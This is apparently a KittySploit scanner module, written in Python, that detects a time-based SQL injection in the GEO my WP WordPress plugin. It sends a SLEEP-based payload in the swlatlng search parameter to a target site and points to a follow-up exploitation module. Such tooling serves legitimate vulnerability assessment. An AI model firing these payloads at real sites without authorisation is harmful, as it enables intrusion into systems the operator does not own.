#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GEO my WP < 4.5.5.1 map boundary SQLi (CVE-2026-52715)."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "geo-my-wp"
_VULN_HIGH = (4, 5, 5)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "GEO my WP CVE-2026-52715 SQLi detect",
        "description": "Time-based SQLi via swlatlng/nelatlng locator search parameters.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-52715",
        "references": ["https://www.cve.org/CVERecord?id=CVE-2026-52715"],
        "modules": ["auxiliary/admin/http/geo_my_wp_cve_2026_52715_sqli"],
        "tags": ["web", "scanner", "wordpress", "geo-my-wp", "sqli", "cve-2026-52715"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/geo_my_wp_cve_2026_52715_sqli"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    page_id = OptString("4", "WordPress page_id hosting GEO my WP search", required=False)
    sleep_seconds = OptInteger(6, "SLEEP duration", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _timed(self, sw: str, nel: str) -> float:
        start = time.monotonic()
        self.http_request(
            method="GET",
            path=self._join("/"),
            params={"page_id": self.page_id or "4", "swlatlng": sw, "nelatlng": nel},
            allow_redirects=True,
            timeout=25,
        )
        return time.monotonic() - start

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        sleep_s = int(self.sleep_seconds or 6)
        base_t = self._timed("1,0", "1,1")
        delayed = self._timed(f"(SELECT SLEEP({sleep_s})),0", "1,1")
        if delayed >= sleep_s - 1 and delayed > base_t + (sleep_s - 2):
            self.set_info(
                severity="critical",
                reason="GEO my WP swlatlng time-based SQLi",
                cve="CVE-2026-52715",
            )
            return True
        return False
